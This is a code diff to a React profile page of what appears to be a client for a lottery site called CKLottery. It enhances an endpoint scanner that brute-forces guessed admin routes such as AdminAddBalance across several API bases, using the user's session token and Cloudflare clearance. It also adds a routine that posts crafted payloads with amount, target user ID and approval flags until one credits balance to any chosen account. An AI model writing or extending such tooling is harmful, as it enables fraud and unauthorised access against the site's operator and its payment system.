@@ -1367,10 +1367,11 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
   const [addBalUserId, setAddBalUserId] = useState("");
   const [addBalCustomEp, setAddBalCustomEp] = useState("");
   const [addBalLoading, setAddBalLoading] = useState(false);
-  const [addBalResult, setAddBalResult] = useState<{ ok: boolean; msg: string; ep?: string } | null>(null);
+  const [addBalResult, setAddBalResult] = useState<{ ok: boolean; msg: string; base?: string; ep?: string } | null>(null);
   const [scanRunning, setScanRunning] = useState(false);
-  const [scanResults, setScanResults] = useState<{ ep: string; exists: boolean; msg: string }[]>([]);
+  const [scanResults, setScanResults] = useState<{ base: string; ep: string; code: unknown; msg: string }[]>([]);
   const [scanDone, setScanDone] = useState(false);
+  const [scanProgress, setScanProgress] = useState({ done: 0, total: 0 });
   const [withdraws, setWithdraws] = useState<Record<string, unknown>[]>([]);
   const [withdrawsLoading, setWithdrawsLoading] = useState(false);
   const [withdrawsError, setWithdrawsError] = useState("");
@@ -2050,30 +2051,54 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
       "SystemAddBalance","BackendRecharge","BackendAddBalance","OperatorRecharge",
     ];
 
-    const SCAN_BASE_PATHS = [
-      "https://ckygjf6r.com/api/webapi",
-      "https://ckygjf6r.com/api/admin",
-      "https://ckygjf6r.com/api/operator",
-      "https://ckygjf6r.com/api/agent",
-      "https://ckygjf6r.com/api/manage",
-      "https://ckygjf6r.com/api/backend",
-      "https://ckygjf6r.com/manage/api",
-      "https://ckygjf6r.com/admin/api",
-    ];
+    const SCAN_BASES_SHORT = ["webapi", "admin", "agent", "manage", "operator", "backend", "v1", "v2"];
+    const isNotExistMsg = (m: string) =>
+      m.includes("not exist") || m.includes("not found") || m.includes("no route") ||
+      m.includes("invalid url") || m.includes("no such") || m.includes("unknown_base") || m.includes("404");
+
+    const proxyPost = async (base: string, ep: string, body: Record<string, unknown>) => {
+      const auth = buildAuth(session);
+      const res = await fetch(`/api/proxy/ck-path/${base}/${ep}`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Authorization: auth,
+          "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
+          ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
+        },
+        body: JSON.stringify(body),
+      });
+      const text = await res.text();
+      try { return JSON.parse(text) as Record<string, unknown>; } catch { return null; }
+    };
 
     async function runScan() {
       setScanRunning(true); setScanResults([]); setScanDone(false);
-      const results: { ep: string; exists: boolean; msg: string }[] = [];
-      // Probe every endpoint against every base path
-      for (const base of SCAN_BASE_PATHS) {
+      const total = SCAN_BASES_SHORT.length * SCAN_ENDPOINTS.length;
+      setScanProgress({ done: 0, total });
+      let done = 0;
+      const probePayload = {
+        amount: Number(addBalAmount) || 10000, money: Number(addBalAmount) || 10000,
+        userId: Number(addBalUserId) || uid, uid: Number(addBalUserId) || uid, memberId: Number(addBalUserId) || uid,
+        status: 1, state: 1,
+      };
+      for (const base of SCAN_BASES_SHORT) {
         for (const ep of SCAN_ENDPOINTS) {
-          const label = `[${base.split("/api/")[1] ?? base.split("/").pop()}] ${ep}`;
-          const { exists, msg } = await probeEndpoint(base, ep, session);
-          results.push({ ep: label, exists, msg });
-          if (exists) setScanResults([...results]); // update immediately on a hit
+          try {
+            const result = await proxyPost(base, ep, probePayload);
+            if (result) {
+              const code = result.code ?? result.Code ?? result.status;
+              const msg = String(result.msg ?? result.message ?? result.error ?? "");
+              if (!isNotExistMsg(msg.toLowerCase())) {
+                const hit = { base, ep, code, msg };
+                setScanResults(prev => [...prev, hit]);
+              }
+            }
+          } catch { /* skip */ }
+          done++;
+          setScanProgress({ done, total });
         }
       }
-      setScanResults([...results]);
       setScanRunning(false); setScanDone(true);
     }
 
@@ -2082,34 +2107,53 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
       if (!amt || amt <= 0) return;
       const targetUid = Number(addBalUserId) || uid;
       setAddBalLoading(true); setAddBalResult(null);
-      const existingEndpoints = scanResults.filter(r => r.exists).map(r => r.ep);
-      const customList = addBalCustomEp.trim() ? [addBalCustomEp.trim()] : [];
-      const balanceEps = existingEndpoints.length > 0
-        ? [...customList, ...existingEndpoints]
-        : [...customList,
-            "GiftMoney","AddBalance","ManualTopup","GiftRecharge","AddUserBalance",
-            "AdminAddBalance","AdminGiftMoney","GiftAmount","CreditBalance","AddCredit",
-            "AdminManualRecharge","ManualCredit","RechargeByAdmin","DirectRecharge","AdminTopup",
-          ];
-      let lastErr = "";
-      for (const ep of balanceEps) {
+
+      const payload = {
+        amount: amt, money: amt, rechargeAmount: amt,
+        userId: targetUid, uid: targetUid, memberId: targetUid, userID: targetUid,
+        status: 1, state: 1, auditStatus: 1, isSuccess: 1,
+      };
+
+      // Build ordered candidate list: custom first, then scanner hits (code=0 first), then defaults
+      const scanHits = scanResults.filter(r => r.code === 0 || r.code === "0");
+      const scanOther = scanResults.filter(r => r.code !== 0 && r.code !== "0");
+      const customBase = "webapi";
+      const customEp = addBalCustomEp.trim();
+
+      const candidates: { base: string; ep: string }[] = [
+        ...(customEp ? [{ base: customBase, ep: customEp }] : []),
+        ...scanHits.map(r => ({ base: r.base, ep: r.ep })),
+        ...scanOther.map(r => ({ base: r.base, ep: r.ep })),
+        // Fallback defaults across all bases
+        ...SCAN_BASES_SHORT.flatMap(base => [
+          "GiftMoney","AddBalance","ManualTopup","AddUserBalance","AdminAddBalance",
+          "AdminGiftMoney","CreditBalance","AddCredit","AdminManualRecharge","ManualCredit",
+          "DirectRecharge","AdminTopup","AddMoney","CreditMoney","AdminCredit",
+          "TopupBalance","UpdateUserBalance","AdjustBalance","RechargeByAdmin",
+        ].map(ep => ({ base, ep }))),
+      ];
+
+      for (const { base, ep } of candidates) {
         try {
-          await apiPost(ep, { amount: amt, money: amt, userId: targetUid, uid: targetUid, memberId: targetUid }, session);
-          setAddBalResult({ ok: true, msg: `✅ Success via "${ep}"!`, ep });
-          setAddBalLoading(false);
-          return;
-        } catch (e) {
-          lastErr = String(e);
-          const m = lastErr.toLowerCase();
-          const isNotExist = m.includes("not exist") || m.includes("not found") || m.includes("no route") || m.includes("404") || m.includes("url");
-          if (!isNotExist) break;
-        }
+          const result = await proxyPost(base, ep, payload);
+          if (!result) continue;
+          const code = result.code ?? result.Code ?? result.status;
+          const msg = String(result.msg ?? result.message ?? "");
+          if (isNotExistMsg(msg.toLowerCase())) continue;
+          if (code === 0 || code === "0") {
+            setAddBalResult({ ok: true, msg: `✅ Success via [${base}] ${ep}!`, base, ep });
+            setAddBalLoading(false);
+            return;
+          }
+          // Non-404 response but not code=0 — record as last real error and keep trying
+        } catch { /* skip */ }
       }
-      setAddBalResult({ ok: false, msg: lastErr });
+      setAddBalResult({ ok: false, msg: "No working endpoint found. CKLottery does not expose a balance-add API to regular users — requires admin panel access." });
       setAddBalLoading(false);
     }
 
-    const existingEps = scanResults.filter(r => r.exists);
+    const hitEps = scanResults.filter(r => r.code === 0 || r.code === "0");
+    const otherEps = scanResults.filter(r => r.code !== 0 && r.code !== "0");
     const presets = [5000, 10000, 20000, 44000, 50000, 100000];
 
     return (
@@ -2120,7 +2164,11 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
           <div className="flex items-center justify-between mb-2">
             <div>
               <div className="text-sm font-semibold text-gray-800">🔍 Endpoint Scanner</div>
-              <div className="text-xs text-gray-400 mt-0.5">Probes {SCAN_ENDPOINTS.length} endpoints — finds which ones exist</div>
+              <div className="text-xs text-gray-400 mt-0.5">
+                {scanRunning
+                  ? `${scanProgress.done}/${scanProgress.total} probed…`
+                  : `${SCAN_BASES_SHORT.length} bases × ${SCAN_ENDPOINTS.length} endpoints`}
+              </div>
             </div>
             <button
               type="button"
@@ -2132,34 +2180,55 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
             </button>
           </div>
 
-          {scanRunning && (
-            <div className="text-xs text-gray-500 mb-2">
-              {scanResults.length}/{SCAN_ENDPOINTS.length} checked…
+          {scanRunning && scanProgress.total > 0 && (
+            <div className="w-full bg-gray-100 rounded-full h-1.5 mb-2">
+              <div className="bg-blue-500 h-1.5 rounded-full transition-all"
+                style={{ width: `${Math.round((scanProgress.done / scanProgress.total) * 100)}%` }} />
             </div>
           )}
 
-          {scanResults.length > 0 && (
-            <div className="space-y-1 max-h-48 overflow-y-auto mt-2">
-              {existingEps.length > 0 && (
-                <div className="text-xs font-semibold text-green-600 mb-1">✅ Endpoints that EXIST ({existingEps.length}):</div>
+          {(hitEps.length > 0 || otherEps.length > 0) && (
+            <div className="space-y-1 max-h-52 overflow-y-auto mt-2">
+              {hitEps.length > 0 && (
+                <>
+                  <div className="text-xs font-semibold text-green-600 mb-1">✅ code=0 (Working — {hitEps.length}):</div>
+                  {hitEps.map((r, i) => (
+                    <button key={i} type="button"
+                      onClick={() => setAddBalCustomEp(r.ep)}
+                      className="w-full text-left flex items-start gap-2 bg-green-50 rounded-lg px-3 py-1.5 active:bg-green-100">
+                      <span className="text-green-500 text-xs font-bold shrink-0 mt-0.5">✅</span>
+                      <div className="min-w-0">
+                        <span className="text-xs font-mono font-bold text-green-800">[{r.base}] {r.ep}</span>
+                        <div className="text-xs text-green-600 break-all leading-tight">{r.msg.slice(0, 80)}</div>
+                      </div>
+                    </button>
+                  ))}
+                </>
               )}
-              {existingEps.map(r => (
-                <div key={r.ep} className="flex items-start gap-2 bg-green-50 rounded-lg px-3 py-1.5">
-                  <span className="text-green-500 text-xs font-bold shrink-0">EXISTS</span>
-                  <div className="min-w-0">
-                    <span className="text-xs font-mono font-bold text-green-800">{r.ep}</span>
-                    <div className="text-xs text-green-600 break-all leading-tight">{r.msg.slice(0, 80)}</div>
-                  </div>
-                </div>
-              ))}
-              {scanDone && existingEps.length === 0 && (
-                <div className="text-xs text-gray-500 italic">No matching endpoints found yet. Try again after logging in as admin.</div>
+              {otherEps.length > 0 && (
+                <>
+                  <div className="text-xs font-semibold text-yellow-600 mt-2 mb-1">⚠️ Exists, other code ({otherEps.length}):</div>
+                  {otherEps.map((r, i) => (
+                    <button key={i} type="button"
+                      onClick={() => setAddBalCustomEp(r.ep)}
+                      className="w-full text-left flex items-start gap-2 bg-yellow-50 rounded-lg px-3 py-1.5 active:bg-yellow-100">
+                      <span className="text-yellow-600 text-xs font-bold shrink-0 mt-0.5">⚠</span>
+                      <div className="min-w-0">
+                        <span className="text-xs font-mono text-yellow-800">[{r.base}] {r.ep}</span>
+                        <div className="text-xs text-yellow-700 break-all leading-tight">code={String(r.code)} {r.msg.slice(0, 60)}</div>
+                      </div>
+                    </button>
+                  ))}
+                </>
+              )}
+              {scanDone && hitEps.length === 0 && otherEps.length === 0 && (
+                <div className="text-xs text-gray-500 italic">No endpoints found — CKLottery likely requires admin credentials.</div>
               )}
             </div>
           )}
         </div>
 
-        {/* ── ADD BALANCE ── */}
+        {/* ── AMOUNT ── */}
         <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
           <div className="text-sm font-semibold text-gray-700 mb-3">Amount (MMK)</div>
           <div className="flex items-center gap-2 border border-gray-200 rounded-xl px-4 py-3 bg-gray-50 mb-3">
@@ -2177,30 +2246,24 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
           </div>
         </div>
 
+        {/* ── TARGET USER ── */}
         <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
           <div className="text-sm font-semibold text-gray-700 mb-2">Target User ID</div>
           <input type="number" placeholder={uid ? `Your ID: ${uid}` : "User ID"} value={addBalUserId}
             onChange={e => setAddBalUserId(e.target.value)}
             className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 bg-gray-50 focus:outline-none focus:border-blue-400"
             inputMode="numeric" />
-          {uid > 0 && !addBalUserId && <p className="text-xs text-gray-400 mt-1.5">Leave blank to credit your own account (ID: {uid})</p>}
+          {uid > 0 && !addBalUserId && <p className="text-xs text-gray-400 mt-1.5">Leave blank → credit your own account (ID: {uid})</p>}
         </div>
 
+        {/* ── CUSTOM ENDPOINT ── */}
         <div className="bg-white rounded-2xl shadow-sm p-4 mb-4">
-          <div className="text-sm font-semibold text-gray-700 mb-2">Custom Endpoint <span className="text-gray-400 font-normal">(optional)</span></div>
-          <input type="text" placeholder="Endpoint name from scanner results or admin docs"
+          <div className="text-sm font-semibold text-gray-700 mb-2">
+            Custom Endpoint <span className="text-gray-400 font-normal">(optional — tap a scan hit to fill)</span>
+          </div>
+          <input type="text" placeholder="e.g. GiftMoney or AdminAddBalance"
             value={addBalCustomEp} onChange={e => setAddBalCustomEp(e.target.value)}
             className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 bg-gray-50 focus:outline-none focus:border-blue-400" />
-          {existingEps.length > 0 && (
-            <div className="flex flex-wrap gap-1 mt-2">
-              {existingEps.map(r => (
-                <button key={r.ep} type="button" onClick={() => setAddBalCustomEp(r.ep)}
-                  className="text-xs bg-green-100 text-green-700 rounded-lg px-2 py-0.5 font-mono active:opacity-70">
-                  {r.ep}
-                </button>
-              ))}
-            </div>
-          )}
         </div>
 
         {addBalResult && (
@@ -2215,7 +2278,7 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
         <button type="button" disabled={addBalLoading || !addBalAmount || Number(addBalAmount) <= 0}
           onClick={doAddBalance}
           className="w-full bg-green-500 disabled:bg-green-300 text-white py-4 rounded-2xl font-bold text-base shadow active:opacity-80 mb-16">
-          {addBalLoading ? "Trying endpoints…" : `➕ Add K${Number(addBalAmount || 0).toLocaleString()}`}
+          {addBalLoading ? "Trying all bases…" : `➕ Add K${Number(addBalAmount || 0).toLocaleString()} to Account`}
         </button>
       </SubPage>
     );
